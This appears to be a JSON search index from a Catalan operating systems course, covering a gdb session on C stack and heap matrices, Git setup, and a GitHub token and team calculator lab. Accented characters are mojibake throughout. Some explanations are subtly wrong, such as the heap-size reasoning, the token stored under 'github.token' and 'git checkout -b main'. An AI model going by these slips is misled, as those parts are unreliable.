{{1, 2, 3}, {4, 5, 6}}\nmatrix = 0xaaaaaaaa0854 &lt;main&gt;\n\n\n\n\n\n\n\nNotaObservaci√≥\n\n\n\nObserva que m esta declarada i inicialitzada, mentre que matrix apunta a una adre√ßa de mem√≤ria. Aquesta adre√ßa de mem√≤ria esta guardada en un altra adre√ßa de mem√≤ria (la del punter matrix ,@z). Pots consultar aquesta adre√ßa amb print &matrix.\n(gdb) print &matrix\n$1 = (int ***) 0xfffffffff2b8\n(gdb) print matrix\n$2 = (int **) 0xaaaaaaaa0854 &lt;main&gt;\n\n\n\nAra anem a consultar la informaci√≥ sobre la variable m:\n(gdb) print &m\n$1 = (int (*)[2][3]) 0xfffffffff2a0\n(gdb) print &m[0]\n$2 = (int (*)[3]) 0xfffffffff2a0\n(gdb) print &m[1]\n$3 = (int (*)[3]) 0xfffffffff2ac\n\n\n\n\n\n\n\nNotaObservaci√≥\n\n\n\nObserva que l‚Äôadre√ßa de m est√† a la pila d‚Äôexecuci√≥ (al voltant de 0xfffffffff2a0). I les adreces de m[0] i m[1] s√≥n consecutives (incrementen en 12 bytes, que √©s la mida d‚Äôuna fila de 3 enters).\n\n\n\nAccedim al primer element de la matriu est√†tica amb print m[0][0].\n(gdb) print &m[0][0] # Ens imprimeix l'adre√ßa del primer element de la matriu est√†tica\n$2 = (int *) 0xfffffffff2a0\n(gdb) print m[0][0] # Ens imprimeix el valor del primer element de la matriu est√†tica\n$3 = 1\nAccedim al segon element de la matriu est√†tica amb print m[0][1].\n(gdb) print &m[0][1] # Ens imprimeix l'adre√ßa del segon element de la matriu est√†tica\n$4 = (int *) 0xfffffffff2a4\n(gdb) print m[0][1] # Ens imprimeix el valor del segon element de la matriu est√†tica\n$5 = 2\nAccedim al tercer element de la matriu est√†tica amb print m[0][2].\n(gdb) print &m[0][2] # Ens imprimeix l'adre√ßa del tercer element de la matriu est√†tica\n$6 = (int *) 0xfffffffff2a8\n(gdb) print m[0][2] # Ens imprimeix el valor del tercer element de la matriu est√†tica\n$7 = 3\nAccedim al primer element de la segona fila de la matriu est√†tica amb print m[1][0].\n(gdb) print &m[1][0] # Ens imprimeix l'adre√ßa del primer element de la segona fila de la matriu est√†tica\n$8 = (int *) 0xfffffffff2ac\n(gdb) print m[1][0] # Ens imprimeix el valor del primer element de la segona fila de la matriu est√†tica\n$9 = 4\nAccedim al segon element de la segona fila de la matriu est√†tica amb print m[1][1].\n(gdb) print &m[1][1] # Ens imprimeix l'adre√ßa del segon element de la segona fila de la matriu est√†tica\n$10 = (int *) 0xfffffffff2b0\n(gdb) print m[1][1] # Ens imprimeix el valor del segon element de la segona fila de la matriu est√†tica\n$11 = 5\nAccedim al tercer element de la segona fila de la matriu est√†tica amb print m[1][2].\n(gdb) print &m[1][2] # Ens imprimeix l'adre√ßa del tercer element de la segona fila de la matriu est√†tica\n$12 = (int *) 0xfffffffff2b4\n(gdb) print m[1][2] # Ens imprimeix el valor del tercer element de la segona fila de la matriu est√†tica\n$13 = 6\nUna forma alternativa de veure els valors i les adreces de la matriu est√†tica m √©s utilitzant el comandament x per examinar la mem√≤ria. Aqu√≠, x/6dw indica que volem veure 6 valors (6) en format decimal (d) i com a enters (w), comen√ßant des de l‚Äôadre√ßa de m[0][0].\n(gdb) x/6dw &m[0][0]\n0xfffffffff2a0: 1   2   3   4\n0xfffffffff2b0: 5   6\n\n\n\n\n\n\n\nNotaAdreces consecutives\n\n\n\nObserveu que les adreces dels elements de la matriu est√†tica s√≥n consecutives (incrementen en 4 bytes, que √©s la mida d‚Äôun enter). Podeu confirmar la mida d‚Äôun enter al gdb amb:\n(gdb) print sizeof(int)\n$14 = 4\n\n\n\nAra anem a inspeccionar la variable matrix, que √©s un punter a punters per a la matriu din√†mica.\n\n(gdb) print matrix\n$6 = (int **) 0xaaaaaaaa0854 &lt;main&gt;\n(gdb) print &matrix\n$7 = (int ***) 0xfffffffff2b8\n(gdb) print &matrix[0]\n$8 = (int **) 0xaaaaaaaa0854 &lt;main&gt;\n(gdb) print &matrix[1]\n$9 = (int **) 0xaaaaaaaa085c &lt;main+8&gt;\n\n\n\n\n\n\nNotaObservaci√≥\n\n\n\nObserva que l‚Äôadre√ßa de matrix tamb√© est√† a la pila d‚Äôexecuci√≥ (al voltant de 0xaaaaaaaa0854). I les adreces de matrix[0] i matrix[1] s√≥n consecutives (incrementen en 8 bytes, que √©s la mida d‚Äôun punter). Podeu confirmar la mida d‚Äôun punter al gdb amb: print sizeof(int*).\n\n\n\nAnem a veure l‚Äôadre√ßa on apunta matrix:\n(gdb) x/6x matrix\n0xaaaaaaaa0854 &lt;main&gt;:  0xa9ba7bfd  0x910003fd  0xf9000bf3  0x90000000\n0xaaaaaaaa0864 &lt;main+16&gt;:   0x912e6000  0x910083e\n\n\n\n\n\n\n\nNotaObservaci√≥\n\n\n\nEl contingut de l‚Äôadre√ßa on apunta matrix sembla ser una adre√ßa de mem√≤ria (per√≤ encara no hem fet el malloc, aix√≠ que no √©s v√†lida encara).\n(gdb) x/6x 0xa9ba7bfd\n0xa9ba7bfd: Cannot access memory at address 0xa9ba7bfd\n\n\n\nAra anem a afegir un altre punt d‚Äôinterrupci√≥ just despr√©s del primer malloc, per veure com canvia la variable matrix despr√©s de l‚Äôassignaci√≥ de mem√≤ria:\n(gdb) break 20\nBreakpoint 3 at 0xaaaaaaaa0944: file lab01.c, line 20.\nContinuem l‚Äôexecuci√≥ fins a aquest punt:\n(gdb) c \nContinuing.\n\nBreakpoint 3, main () at lab01.c:20\n20          matrix[i] = malloc(3 * sizeof(int));  // espai per 3 enters\nAra podem inspeccionar la variable matrix de nou:\n(gdb) print matrix\n$11 = (int **) 0xaaaaaaac16b0\n(gdb) x/20x matrix\n0xaaaaaaac16b0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16c0: 0x00000000  0x00000000  0x00020941  0x00000000\n0xaaaaaaac16d0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16f0: 0x00000000  0x00000000  0x00000000  0x00000000\n(gdb) print &matrix[0]\n$12 = (int **) 0xaaaaaaac16b0\n(gdb) print &matrix[1]\n$13 = (int **) 0xaaaaaaac16b8\n(gdb) x/6x 0xaaaaaaac16b0\n0xaaaaaaac16b0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16c0: 0x00000000  0x00000000\n(gdb) x/6x 0xaaaaaaac16b8\n0xaaaaaaac16b8: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16c8: 0x00020941  0x00000000\nEl malloc ha assignat mem√≤ria per a 2 punters (matrix[0] i matrix[1]), per√≤ encara no hem assignat mem√≤ria per a les files de la matriu (aix√≤ ho fem en el seg√ºent bucle for).\nSi fem continue una altra vegada, s‚Äôexecutar√† la primera iteraci√≥ del bucle for que assigna mem√≤ria per a la primera fila de la matriu din√†mica.\n(gdb) x/20x matrix\n0xaaaaaaac16b0: 0xaaac16d0  0x0000aaaa  0x00000000  0x00000000\n0xaaaaaaac16c0: 0x00000000  0x00000000  0x00000021  0x00000000\n0xaaaaaaac16d0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000  0x00020921  0x00000000\n0xaaaaaaac16f0: 0x00000000  0x00000000  0x00000000  0x00000000\n\nAra posem un breakpoint a la l√≠nia 31 break 31 (al printf de la matriu din√†mica) i continuem l‚Äôexecuci√≥: continue.\n(gdb) x/20x matrix\n0xaaaaaaac16b0: 0xaaac16d0  0x0000aaaa  0xaaac16f0  0x0000aaaa\n0xaaaaaaac16c0: 0x00000000  0x00000000  0x00000021  0x00000000\n0xaaaaaaac16d0: 0x00000001  0x00000002  0x00000003  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000  0x00000021  0x00000000\n0xaaaaaaac16f0: 0x00000004  0x00000005  0x00000006  0x00000000\n(gdb) print &matrix[0][0]\n$12 = (int *) 0xaaaaaaac16d0\n(gdb) print &matrix[1][0]\n$13 = (int *) 0xaaaaaaac16f0\nObservem que ara matrix[0] i matrix[1] apunten a adreces v√†lides a la mem√≤ria heap (0xaaaaaaac16d0 i 0xaaaaaaac16f0 respectivament).\nAnem veure el contingut de la mem√≤ria a partir d‚Äôaquestes adreces:\n(gdb) x/6x 0xaaaaaaac16d0\n0xaaaaaaac16d0: 0x00000001  0x00000002  0x00000003  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000\n(gdb) x/6x 0xaaaaaaac16f0\n0xaaaaaaac16f0: 0x00000004  0x00000005  0x00000006  0x00000000\n0xaaaaaaac1700: 0x00000000  0x00000000\n(gdb) x/6dw &matrix[0][0]\n0xaaaaaaac16d0: 1   2   3   0\n0xaaaaaaac16e0: 0   0\n(gdb) x/6dw &matrix[1][0]\n0xaaaaaaac16f0: 4   5   6   0\n0xaaaaaaac1700: 0   0\nAnem a veure el contingut de la mem√≤ria a partir d‚Äôaquestes adreces:\n(gdb) print matrix[0][0]\n$14 = 1\n(gdb) print matrix[0][1]\n$15 = 2\n(gdb) print matrix[0][2]\n$16 = 3\n(gdb) print matrix[1][0]\n$17 = 4\n(gdb) print matrix[1][1]\n$18 = 5\n(gdb) print matrix[1][2]\n$19 = 6\n\nEn aquest punt, podem veure la mida actual de la mem√≤ria heap:\n\n(gdb) print mallinfo()\n$15 = {arena = 135168, ordblks = 1, smblks = 0, hblks = 0, hblkhd = 0, usmblks = 0, fsmblks = 0, uordblks = 1792,\n  fordblks = 133376, keepcost = 133376}\n\n\n\n\n\n\nNotaObservaci√≥\n\n\n\nObservem que la mem√≤ria utilitzada a la heap (uordblks) √©s de 1792 bytes, que correspon a les dues files de 3 enters cadascuna (2 * 3 * 4 = 24 bytes) m√©s l‚Äôoverhead del malloc.\n\n\n\nFinalment, posem un breakpoint just abans del return 0; (l√≠nia 38) i continuem l‚Äôexecuci√≥ fins a aquest punt:\n\n(gdb) break 38\nBreakpoint 4 at 0xaaaaaaaa0968: file lab01.c, line 38.\n(gdb) c\nContinuing.\n\nBreakpoint 4, main () at lab01.c:38\n38      return 0;\n\nAra podem inspeccionar les variables locals de nou:\n\n(gdb) info locals\nm = {{1, 2, 3}, {4, 5, 6}}\nmatrix = 0xaaaaaaac16b0\nAra b√© com que hem fet els free de la mem√≤ria din√†mica, si mirem la mida de la heap veiem que ha disminu√Øt i que tot i que les adreces matrix[0] i matrix[1] encara s√≥n les mateixes, el contingut de la mem√≤ria ja no √©s v√†lid:\n(gdb) print mallinfo()\n(gdb) x/6x 0xaaaaaaac16d0\n0xaaaaaaac16d0: 0xaaaaaac1  0x0000000a  0xac976b95  0xe5702979\n0xaaaaaaac16e0: 0x00000000  0x00000000\n(gdb) x/6x 0xaaaaaaac16f0\n0xaaaaaaac16f0: 0x0006bc11  0x0000aaa0  0xac976b95  0xe5702979\n0xaaaaaaac1700: 0x00000000  0x00000000",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 ¬∑ Punters¬∑Heap¬∑Stack en C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html",
    "href": "labs/01-introduction/lab04.html",
    "title": "Laboratori 4: Configurant Git a la m√†quina virtual",
    "section": "",
    "text": "Instal¬∑lar i configurar Git a la m√†quina virtual.\nReplicar l‚Äôexemple de les diapositives utilitzant Visual Studio Code (VSCode) i Git.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 ¬∑ Configurant Git a la m√†quina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#objectius",
    "href": "labs/01-introduction/lab04.html#objectius",
    "title": "Laboratori 4: Configurant Git a la m√†quina virtual",
    "section": "",
    "text": "Instal¬∑lar i configurar Git a la m√†quina virtual.\nReplicar l‚Äôexemple de les diapositives utilitzant Visual Studio Code (VSCode) i Git.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 ¬∑ Configurant Git a la m√†quina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#requisits-previs",
    "href": "labs/01-introduction/lab04.html#requisits-previs",
    "title": "Laboratori 4: Configurant Git a la m√†quina virtual",
    "section": "Requisits previs",
    "text": "Requisits previs\n\nM√†quina virtual en funcionament (vegeu Laboratori 1).\nVisual Studio Code (VSCode) connectat a la m√†quina virtual mitjan√ßant SSH (vegeu Laboratori 2).",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 ¬∑ Configurant Git a la m√†quina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#installaci√≥-de-git-a-la-m√†quina-virtual",
    "href": "labs/01-introduction/lab04.html#installaci√≥-de-git-a-la-m√†quina-virtual",
    "title": "Laboratori 4: Configurant Git a la m√†quina virtual",
    "section": "Instal¬∑laci√≥ de Git a la m√†quina virtual",
    "text": "Instal¬∑laci√≥ de Git a la m√†quina virtual\n\nConnecteu VSCode a la m√†quina virtual mitjan√ßant SSH (vegeu Laboratori 2).\nInicia la sessi√≥ de l‚Äôusuari root amb la comanda:\nsu -\nEl guionet - √©s important perqu√® carregui correctament les variables d‚Äôentorn de l‚Äôusuari root.\nCom a usuari root. Instal¬∑la el programari git amb la comanda:\napt install git -y\nUn cop finalitzi la instal¬∑laci√≥, comproveu la versi√≥ de git amb la comanda:\ngit --version\nSortiu de la sessi√≥ de l‚Äôusuari root amb la comanda:\nexit",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 ¬∑ Configurant Git a la m√†quina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#configuraci√≥-de-git",
    "href": "labs/01-introduction/lab04.html#configuraci√≥-de-git",
    "title": "Laboratori 4: Configurant Git a la m√†quina virtual",
    "section": "Configuraci√≥ de Git",
    "text": "Configuraci√≥ de Git\nPer comen√ßar a treballar amb Git, primer cal configurar el nostre usuari i correu electr√≤nic. Aquesta informaci√≥ s‚Äôutilitzar√† per identificar els commits que fem al repositori. Per configurar el nostre usuari i correu electr√≤nic, executem les seg√ºents comandes:\ngit config --global user.name \"JordiMateo\"\ngit config --global user.email \"jordi.mateo@udl.cat\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 ¬∑ Configurant Git a la m√†quina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#replicaci√≥-de-lexemple",
    "href": "labs/01-introduction/lab04.html#replicaci√≥-de-lexemple",
    "title": "Laboratori 4: Configurant Git a la m√†quina virtual",
    "section": "Replicaci√≥ de l‚Äôexemple",
    "text": "Replicaci√≥ de l‚Äôexemple\n\nCrearem un repositori nou anomenat projecte-final:\nmkdir projecte-final\nAccedim al directori del projecte:\ncd projecte-final\no b√© podeu fer click a Obre la carpeta a VSCode i seleccionar el directori projecte-final.\n\nCrearem els 3 fitxers (treball.txt, figura1.png, figura2.png) i els afegirem al directori de treball:\necho \"Aquest √©s el fitxer de treball.\" &gt; treball.txt\ntouch figura1.png figura2.png\n\nAra inicialitzarem el repositori Git:\ngit init\n\no b√©, podeu fer click a la icona de Git a la barra lateral esquerra de VSCode i fer click a Inicia el repositori Git.\n\n\n\n\n\n\n\nNota\n\n\n\n\nSi feu anar la l√≠nia de comandes, haures de posar els fitxers a la caixa d‚Äôespera (staging area) manualment. git add . afegeix tots els fitxers del directori actual a la caixa d‚Äôespera.\nSi feu servir la eina integrada de Git a VSCode, us apareixer√† una finestra emergent que us demanar√† si voleu afegir tots els fitxers a la caixa d‚Äôespera (staging area). Feu click a Yes.\n\n\n\n\nSi us fixeu, veureu que VSCODE us indica que hi ha 3 fitxers nous que encara no s‚Äôhan confirmat (posats al cami√≥ de mudances).\n\n\n\nAra farem el primer commit amb el missatge ‚ÄúPrimer commit: Afegits els fitxers inicials‚Äù. Podeu fer-ho des de la l√≠nia de comandes:\ngit commit -m \"Primer commit: Afegits els fitxers inicials\"\no b√©, podeu fer click a la icona de Git a la barra lateral esquerra de VSCode, escriure el missatge del commit i fer click a la icona de check (‚úì) per confirmar els canvis.\n\n\n\n\n\n\n\n\nNota\n\n\n\nObserveu que despr√©s de fer el commit, els fitxers ja no apareixen a la secci√≥ de canvis pendents (Changes). I teniu la linia temporal inicialitzada amb un commit.\n\n\n\n\nFarem un canvi al fitxer treball.txt:\necho \"Afegit la introducci√≥.\" &gt;&gt; treball.txt\n\nCom el document treball.txt ja est√† a la caixa d‚Äôespera, nom√©s cal que fem un nou commit:\ngit commit -am \"Segon commit: Afegida la introducci√≥ al fitxer de treball\"\n\nAra podem veure l‚Äôhistorial dels commits fets fins ara:\ngit log\n\nPodem tornar a una versi√≥ anterior si cal. Per exemple, per tornar al primer commit:\ngit checkout HEAD~1\no b√©, utilitzant VSCODE i fent click a la icona de Git a la barra lateral esquerra, despr√©s a la pestanya d‚ÄôHistorial (History) i fent click dret al commit on volem tornar i seleccionant l‚Äôopci√≥ Checkout.\n\n\n\n\n\n\n\n\nNota\n\n\n\nQuan fem un checkout a una versi√≥ anterior, el directori de treball es posa en la versi√≥ seleccionada, ara ja no tenim el text ‚ÄúAfegit la introducci√≥.‚Äù al fitxer treball.txt. Aix√≤ √©s perqu√® hem tornat a la versi√≥ anterior on aquest canvi no existia.\n\n\n\nPer tornar a la versi√≥ m√©s recent, fem:\ngit checkout main\n\n\n\n\n\n\n\n\nNota\n\n\n\nQuan fem un checkout a la versi√≥ m√©s recent, el directori de treball es torna a la versi√≥ m√©s nova, i ara tornem a tenir el text ‚ÄúAfegit la introducci√≥.‚Äù al fitxer treball.txt.\n\n\n\nAra podem crear una branca nova per treballar en una nova funcionalitat:\ngit checkout -b metodologia\no b√©, utilitzant VSCODE i fent click a la icona de Git a la barra lateral esquerra, despr√©s a la part inferior esquerra on apareix el nom de la branca actual (main) i fent click a Create new branch.\n\nFarem un canvi al fitxer treball.txt a la branca metodologia:\necho \"Afegida la secci√≥ de metodologia.\" &gt;&gt; treball.txt\n\nFem un commit amb aquest canvi:\ngit commit -m \"Afegida la secci√≥ de metodologia al fitxer de treball\"\nPodem veure les branques existents:\ngit branch\n\nPer tornar a la branca principal:\ngit checkout main\nPer anar a la branca metodologia:\ngit checkout metodologia\nTamb√© podem fusionar la branca metodologia a la branca main:\ngit checkout main\ngit merge metodologia\n\n\nAmb aix√≤ hem explorat les funcionalitats b√†siques de Git. Podeu continuar experimentant amb m√©s canvis, branques i commits per familiaritzar-vos amb el flux de treball de Git.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 ¬∑ Configurant Git a la m√†quina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab04.html#exercici-extra-opcional",
    "href": "labs/01-introduction/lab04.html#exercici-extra-opcional",
    "title": "Laboratori 4: Configurant Git a la m√†quina virtual",
    "section": "Exercici Extra (opcional)",
    "text": "Exercici Extra (opcional)\nPodeu intentar superar els nivells del joc Learn Git Branching per practicar m√©s les vostres habilitats amb Git. Centreu-vos en els exercicis MAIN.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 4 ¬∑ Configurant Git a la m√†quina virtual"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab05.html",
    "href": "labs/01-introduction/lab05.html",
    "title": "Laboratori 5: Calculadora col¬∑laborativa",
    "section": "",
    "text": "Crea un compte a GitHub: Si no tens un compte a GitHub, visita https://github.com/ i crea un compte gratu√Øt.\n\n\n\nInicia la sessi√≥ al teu compte de GitHub en el navegador web.\nFes clic a la teva foto de perfil a la cantonada superior dreta i selecciona Configuraci√≥ al men√∫ desplegable.\nA la p√†gina de configuraci√≥ de GitHub, selecciona Configuraci√≥ de desenvolupador al men√∫ lateral esquerre.\nA la secci√≥ Tokens personals, fes clic a Genera un token personal i selecciona un Token (cl√°ssic) per a l‚Äô√∫s amb la l√≠nia de comandes.\n\n\n\n\nGenerar token\n\n\nEn aquest punt completa la informaci√≥ requerida i fes clic a Generar token:\n\nIntrodueix un nom per al teu token.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nToken per a la m√†quina virtual del curs 2526 de Sistemes Operatius\n\n\n\nSelecciona els permisos que necessites per al teu token. Per a la majoria de les operacions b√†siques, com ara clonar repositoris i fer push, necessitar√†s almenys els permisos seg√ºents:\n\nrepo (per accedir als repositoris privats i p√∫blics)\nworkflow (per executar workflows de GitHub Actions)\nwrite:packages (per pujar paquets a GitHub Packages)\n\nSelecciona una data de caducitat per al teu token. √âs recomanable establir una data de caducitat per motius de seguretat.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nPots seleccionar Custom i posar fins al 01/02/2026 on ja haur√† acabat el curs.\n\n\n\n\n\n\nInicia una sessi√≥ a la terminal de la m√†quina virtual com a usuari normal.\nConfigura Git per utilitzar el token de GitHub executant la seg√ºent comanda:\ngit config --global github.token TOKEN\n\n\n\n\n\n\nConsellImportant:\n\n\n\nAssegura‚Äôt de substituir TOKEN pel token d‚Äôacc√©s personal que has generat a GitHub. Aix√≤ emmagatzemar√† el token de GitHub en la configuraci√≥ global de Git al teu sistema Debian.\n\n\nVerifica que el token s‚Äôhagi configurat correctament executant:\ngit config --global --get github.token\n\nSi tot ha anat b√©, veur√†s el token que has configurat a la sortida d‚Äôaquesta comanda.\n\n\n\n\n\n\nAlertaNota:\n\n\n\nGithub ja no permet l‚Äô√∫s de contrasenyes per a operacions Git que requereixen autenticaci√≥. En lloc d‚Äôaix√≤, has de fer servir un token d‚Äôacc√©s personal (PAT) per autenticar-te quan fas operacions com git push o git pull en repositoris remots. Per tant, √©s important que utilitzis el token d‚Äôacc√©s personal que has generat en lloc de la teva contrasenya habitual quan se‚Äôt demani autenticaci√≥ des d‚Äôuna l√≠nia de comandes o des d‚Äôun IDE com VSCode.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 ¬∑ Calculadora col¬∑laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab05.html#configurant-github",
    "href": "labs/01-introduction/lab05.html#configurant-github",
    "title": "Laboratori 5: Calculadora col¬∑laborativa",
    "section": "",
    "text": "Crea un compte a GitHub: Si no tens un compte a GitHub, visita https://github.com/ i crea un compte gratu√Øt.\n\n\n\nInicia la sessi√≥ al teu compte de GitHub en el navegador web.\nFes clic a la teva foto de perfil a la cantonada superior dreta i selecciona Configuraci√≥ al men√∫ desplegable.\nA la p√†gina de configuraci√≥ de GitHub, selecciona Configuraci√≥ de desenvolupador al men√∫ lateral esquerre.\nA la secci√≥ Tokens personals, fes clic a Genera un token personal i selecciona un Token (cl√°ssic) per a l‚Äô√∫s amb la l√≠nia de comandes.\n\n\n\n\nGenerar token\n\n\nEn aquest punt completa la informaci√≥ requerida i fes clic a Generar token:\n\nIntrodueix un nom per al teu token.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nToken per a la m√†quina virtual del curs 2526 de Sistemes Operatius\n\n\n\nSelecciona els permisos que necessites per al teu token. Per a la majoria de les operacions b√†siques, com ara clonar repositoris i fer push, necessitar√†s almenys els permisos seg√ºents:\n\nrepo (per accedir als repositoris privats i p√∫blics)\nworkflow (per executar workflows de GitHub Actions)\nwrite:packages (per pujar paquets a GitHub Packages)\n\nSelecciona una data de caducitat per al teu token. √âs recomanable establir una data de caducitat per motius de seguretat.\n\n\n\n\n\n\n\nNotaPer exemple:\n\n\n\nPots seleccionar Custom i posar fins al 01/02/2026 on ja haur√† acabat el curs.\n\n\n\n\n\n\nInicia una sessi√≥ a la terminal de la m√†quina virtual com a usuari normal.\nConfigura Git per utilitzar el token de GitHub executant la seg√ºent comanda:\ngit config --global github.token TOKEN\n\n\n\n\n\n\nConsellImportant:\n\n\n\nAssegura‚Äôt de substituir TOKEN pel token d‚Äôacc√©s personal que has generat a GitHub. Aix√≤ emmagatzemar√† el token de GitHub en la configuraci√≥ global de Git al teu sistema Debian.\n\n\nVerifica que el token s‚Äôhagi configurat correctament executant:\ngit config --global --get github.token\n\nSi tot ha anat b√©, veur√†s el token que has configurat a la sortida d‚Äôaquesta comanda.\n\n\n\n\n\n\nAlertaNota:\n\n\n\nGithub ja no permet l‚Äô√∫s de contrasenyes per a operacions Git que requereixen autenticaci√≥. En lloc d‚Äôaix√≤, has de fer servir un token d‚Äôacc√©s personal (PAT) per autenticar-te quan fas operacions com git push o git pull en repositoris remots. Per tant, √©s important que utilitzis el token d‚Äôacc√©s personal que has generat en lloc de la teva contrasenya habitual quan se‚Äôt demani autenticaci√≥ des d‚Äôuna l√≠nia de comandes o des d‚Äôun IDE com VSCode.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 5 ¬∑ Calculadora col¬∑laborativa amb C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab05.html#tasques",
    "href": "labs/01-introduction/lab05.html#tasques",
    "title": "Laboratori 5: Calculadora col¬∑laborativa",
    "section": "Tasques",
    "text": "Tasques\n\nCreaci√≥ d‚Äôequips\n\nFormeu equips de 3 persones. Cada grup haur√† d‚Äôescollir un l√≠der, que ser√† el responsable de coordinar el treball, gestionar el repositori i fer el seguiment del projecte.\nTrieu un nom d‚Äôequip original.\n\n\n\nPreparaci√≥ del projecte\nEnlla√ß de la tasca a GitHub Classroom: https://classroom.github.com/a/bxb1jFbT\n\nEl l√≠der de l‚Äôequip haur√† d‚Äôiniciar el grup a trav√©s de GitHub Classroom.\n\nIntrodueix el nom de l‚Äôequip.\n\nAccepta la tasca.\n\nUn cop acceptada la tasca, es crear√† un repositori per a l‚Äôequip.\n\n\nLa resta de membres s‚Äôhi podran unir seleccionant el nom de l‚Äôequip al mateix enlla√ß https://classroom.github.com/a/bxb1jFbT.\nEl repositori base contindr√† el codi inicial necessari i la seva estructura.\n\nEl l√≠der √©s responsable d‚Äôassignar les tasques a cada membre mitjan√ßant issues a GitHub.\nPer fer-ho:\n\nFer clic a la pestanya Issues.\n\nFer clic a New issue, i seleccionar Feature request.\n\nUs he preparat una plantilla per a les issues. Feu clic a Get started.\n\nOmplir el t√≠tol i la descripci√≥ de la tasca.\nAssignar la tasca a un membre de l‚Äôequip. Click a Assignees i seleccionar el membre.\nUn cop assignada la tasca, fer clic a Submit new issue.\n\nLlista de tasques i assignaci√≥:\n\n\n\nTasca\nAssignat a\n\n\n\n\nImplementaci√≥ de la funci√≥ de suma\nl√≠der\n\n\nImplementaci√≥ de la funci√≥ de resta\nl√≠der\n\n\nImplementaci√≥ de la funci√≥ de multiplicaci√≥\nmembre1\n\n\nImplementaci√≥ de la funci√≥ de divisi√≥\nmembre1\n\n\nImplementaci√≥ de la funci√≥ de pot√®ncia\nmembre2\n\n\nImplementaci√≥ de la funci√≥ de arrels quadrades\nmembre2\n\n\n\n\n\n\nTreball individual\nInstal¬∑la el paquet build-essential, que inclou les eines i llibreries necess√†ries per compilar i construir programes en C. Aquest paquet inclou el compilador GCC, que √©s comunament utilitzat per programar en C.\napt install build-essential -y\n\nCada membre de l‚Äôequip haur√† de clonar el repositori al seu ordinador i crear una branca develop per les seves tasques.\ngit clone URL_DEL_REPOSITORI\ncd NOM_DEL_REPOSITORI\n\n\n\n\n\n\n\nNota\n\n\n\nSi feu clic a Code al repositori, podreu copiar la URL del repositori. \n\n\n\n\n\n\n\n\nConsellRecomanaci√≥:\n\n\n\nTanqueu la sessi√≥ de VSCode i torneu-la a obrir per√≤ indicant la ruta a la carpeta del projecte. En el meu cas, seria /home/jordi/test/projecte-0-calculadora-teacher. D‚Äôaquesta manera, podreu utilitzar les eines de VSCode per a desenvolupar el projecte.\n\n\n\n\n\nPer cada tasca assignada, el membre haur√† de crear una branca amb el nom de la tasca. Per exemple, si la tasca √©s implementar la funci√≥ de suma, la branca es podria anomenar feature-suma.\ngit checkout -b feature-suma\nObserveu que VSCode us mostra la branca actual a la part inferior esquerra.\n\n\n\nEl codi de la funci√≥ suma podria ser:\n// calc.c\nint suma(int a, int b) {\n    return a + b;\n}\n// calc.h\nint suma(int a, int b);\nReviseu el fitxer src/main.c per a cridar la funci√≥ sumacorrectament de la llibreria calc.\nCompileu el codi i comproveu que funciona correctament.\nmake\n./bin/calc\n\n\n\n\n\n\n\n\nConsellNota:\n\n\n\nSi tot funciona correctament, el codi s‚Äôexecutar√† i mostrar√† el resultat de la suma.\n\n\n\nUn cop finalitzada la tasca, fer un commit amb els canvis realitzats indicant la tasca realitzada. Teniu dos opcions per fer el commit:\n\nAmb les eines de VSCode: Feu clic a la icona de la branca a la part inferior esquerra i seleccioneu Commit. Despr√©s, introdu√Øu el missatge de commit i confirmeu-lo.\n\n\n\nAmb la terminal.\ngit add src/calc.c src/calc.h src/main.c\ngit commit -m \"@feat: Implementaci√≥ de la funci√≥ de suma\"\n\n\n\n\n\n\n\n\n\nAlerta\n\n\n\nSi no feu git add abans de fer el commit, no es pujaran els canvis al repositori. Aix√≠ que assegureu-vos de fer git add abans de fer el commit.\n\n\n\n\n\n\n\n\n\nConsell\n\n\n\nUtilitza els missatges de commit per tancar les issues relacionades amb la tasca. Per exemple, si la tasca √©s implementar la funci√≥ de suma, el missatge de commit podria ser: git commit -m \"@feat: Implementaci√≥ de la funci√≥ de suma. Closes #1\". Si la tasca 1 √©s la implementaci√≥ de la funci√≥ de suma.\n\n\nRepeteix els passos 2 i 3 per a cada tasca assignada. Sempre creant la branca des de main. Per tornar a la branca main, feu git checkout main. O b√©, click a la branca a la part inferior esquerra de VSCode i seleccioneu main. Un cop finalitzades les seves tasques ajuntarem totes les branques a la nostra branca local main.\ngit checkout -b main\ngit merge feature-suma \n\n\n\n\n\n\n\nAlertaImportant:\n\n\n\nSi hi ha conflictes, caldr√† resoldre‚Äôls abans de fer el commit.\n\nPer fer-ho amb VSCode, farem clic a la icona 